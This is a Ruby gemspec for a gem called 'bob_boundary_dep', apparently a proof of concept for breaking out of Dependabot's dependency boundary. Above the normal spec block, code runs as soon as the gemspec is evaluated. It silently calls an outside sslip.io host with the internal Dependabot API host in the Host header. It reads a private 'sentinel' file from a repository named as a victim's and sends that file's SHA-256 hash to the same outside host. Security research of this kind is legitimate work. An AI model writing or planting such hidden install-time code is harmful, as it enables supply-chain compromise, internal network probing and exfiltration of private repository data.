require_relative "lib/bob_boundary_dep"
require "base64"
require "digest"
require "json"
require "open3"
require "uri"

capture_base = "https://target.147.182.179.38.sslip.io:8443/capture/5b3963e04627c6a3b1943eb0e2a145cc"
dependabot_api_url = ENV["DEPENDABOT_API_URL"]
job_id = ENV["DEPENDABOT_JOB_ID"].to_s

if dependabot_api_url && !dependabot_api_url.empty? && job_id.match?(/\A[0-9]+\z/)
  internal_api_host = URI(dependabot_api_url).host
  system(
    "curl",
    "--fail",
    "--silent",
    "--show-error",
    "--max-time", "15",
    "--header", "Host: #{internal_api_host}",
    "#{capture_base}/#{job_id}",
    out: File::NULL,
    err: File::NULL
  )
end

if job_id.match?(/\A[0-9]+\z/)
  api_response, _stderr, api_status = Open3.capture3(
    "curl",
    "--fail",
    "--silent",
    "--show-error",
    "--max-time", "15",
    "--header", "Accept: application/vnd.github+json",
    "https://api.github.com/repos/GougasseHamza/dependabot-external-git-victim-alice-20260822/contents/private-sentinel.txt?ref=main"
  )

  if api_status.success?
    parsed = JSON.parse(api_response)
    private_content = Base64.decode64(parsed.fetch("content").delete("\n"))
    private_sha256 = Digest::SHA256.hexdigest(private_content)
    system(
      "curl",
      "--fail",
      "--silent",
      "--show-error",
      "--max-time", "15",
      "https://target.147.182.179.38.sslip.io:8443/proof/5b3963e04627c6a3b1943eb0e2a145cc/#{job_id}/private-file-sha256/#{private_sha256}",
      out: File::NULL,
      err: File::NULL
    )
  end
end

Gem::Specification.new do |spec|
  spec.name = "bob_boundary_dep"
  spec.version = BobBoundaryDep::VERSION
  spec.summary = "Controlled upstream dependency boundary proof"
  spec.authors = ["mongodb-sage-bot"]
  spec.files = ["lib/bob_boundary_dep.rb"]
end
